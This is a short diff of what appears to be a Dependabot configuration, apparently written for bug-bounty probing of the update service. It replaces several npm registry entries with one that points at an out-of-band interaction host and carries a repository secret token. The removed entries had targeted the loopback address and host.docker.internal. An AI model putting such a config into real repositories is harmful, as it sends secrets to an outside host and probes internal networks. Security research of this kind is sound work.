@@ -1,23 +1,8 @@
 version: 2
 registries:
-  bb-oast-https:
+  bb-oast-solo:
     type: npm-registry
-    url: https://da7od3e358616t5p6ck0asttg1ttkt4q3.oast.me/arm-https
-    token: ${{secrets.BBTEST_REG_TOKEN}}
-    replaces-base: true
-  bb-oast-http:
-    type: npm-registry
-    url: http://da7od3e358616t5p6ck0asttg1ttkt4q3.oast.me/arm-http
-    token: ${{secrets.BBTEST_REG_TOKEN}}
-    replaces-base: true
-  bb-loopback:
-    type: npm-registry
-    url: http://127.0.0.1:1080/arm-loopback
-    token: ${{secrets.BBTEST_REG_TOKEN}}
-    replaces-base: true
-  bb-hostdocker:
-    type: npm-registry
-    url: http://host.docker.internal/arm-hostdocker
+    url: https://da7od3e358616t5p6ck0asttg1ttkt4q3.oast.me/arm-solo
     token: ${{secrets.BBTEST_REG_TOKEN}}
     replaces-base: true
 updates:
@@ -25,9 +10,5 @@ updates:
     directory: "/"
     schedule:
       interval: "daily"
-      cronjob: "0 3 * * *"
     registries:
-      - bb-oast-https
-      - bb-oast-http
-      - bb-loopback
-      - bb-hostdocker
+      - bb-oast-solo
